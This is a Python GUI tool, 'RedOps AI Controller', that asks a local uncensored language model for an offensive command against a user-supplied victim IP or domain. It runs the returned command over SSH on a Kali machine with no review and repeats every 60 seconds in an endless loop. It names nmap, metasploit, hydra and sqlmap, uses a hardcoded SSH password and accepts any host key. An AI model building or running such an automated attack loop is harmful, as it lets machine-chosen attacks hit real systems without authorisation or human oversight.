import paramiko
import requests
import json
import time
from datetime import datetime
import tkinter as tk
from tkinter import scrolledtext, messagebox
import threading

# === CONFIGURATION ===
LM_STUDIO_API = "http://localhost:1234/v1/completions"  # Adjust if using chat endpoint
LM_MODEL = "llama-3.1-8b-lexi-uncensored-v2:2"
KALI_IP = "192.168.1.218"
KALI_USER = "redops-attack-engine"
KALI_PASS = "i"  # For real setups, use SSH key
OUTPUT_FILE = "attack_report.json"

# === LM Studio Prompt ===
def ask_lmstudio(victim_ip):
    headers = {"Content-Type": "application/json"}
    prompt = f"Suggest a Linux-based offensive command using nmap, metasploit, hydra, sqlmap, or OpenVAS against target: {victim_ip}"

    payload = {
        "model": LM_MODEL,
        "prompt": prompt,
        "temperature": 0.7,
        "max_tokens": 150
    }

    try:
        response = requests.post(LM_STUDIO_API, headers=headers, data=json.dumps(payload))
        result = response.json()
        command = result['choices'][0]['text']
        return command.strip()
    except Exception as e:
        return f"ERROR contacting LM Studio: {str(e)}"

# === SSH Execution on Kali ===
def execute_ssh_command(command):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(KALI_IP, username=KALI_USER, password=KALI_PASS)
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode()
        error = stderr.read().decode()
        client.close()
        return output, error
    except Exception as e:
        return "", f"SSH Error: {str(e)}"

# === GUI App Logic ===
class AttackApp:
    def __init__(self, root):
        self.root = root
        self.root.title("RedOps AI Controller")

        tk.Label(root, text="Enter Victim IP / Domain:").pack()
        self.victim_entry = tk.Entry(root, width=50)
        self.victim_entry.pack()

        self.start_button = tk.Button(root, text="Start Attack", command=self.start_attack_thread)
        self.start_button.pack(pady=5)

        self.log = scrolledtext.ScrolledText(root, width=80, height=20)
        self.log.pack()

    def start_attack_thread(self):
        victim = self.victim_entry.get().strip()
        if not victim:
            messagebox.showerror("Input Error", "Please enter a valid IP or domain.")
            return
        self.start_button.config(state=tk.DISABLED)
        thread = threading.Thread(target=self.run_attack_loop, args=(victim,))
        thread.daemon = True
        thread.start()

    def run_attack_loop(self, victim):
        while True:
            self.log.insert(tk.END, f"\n[*] Asking LM Studio for attack on {victim}...\n")
            self.log.see(tk.END)
            attack_cmd = ask_lmstudio(victim)
            self.log.insert(tk.END, f"[+] Suggested Command: {attack_cmd}\n")

            output, error = execute_ssh_command(attack_cmd)
            timestamp = datetime.now().isoformat()
            report = {
                "timestamp": timestamp,
                "victim": victim,
                "ai_command": attack_cmd,
                "output": output.strip(),
                "error": error.strip()
            }

            with open(OUTPUT_FILE, "a") as f:
                f.write(json.dumps(report, indent=2) + ",\n")

            self.log.insert(tk.END, "[✓] Attack executed. Waiting 60 seconds...\n")
            self.log.see(tk.END)
            time.sleep(60)  # Wait 60 seconds before next attack

# === Launch GUI ===
if __name__ == "__main__":
    root = tk.Tk()
    app = AttackApp(root)
    root.mainloop()
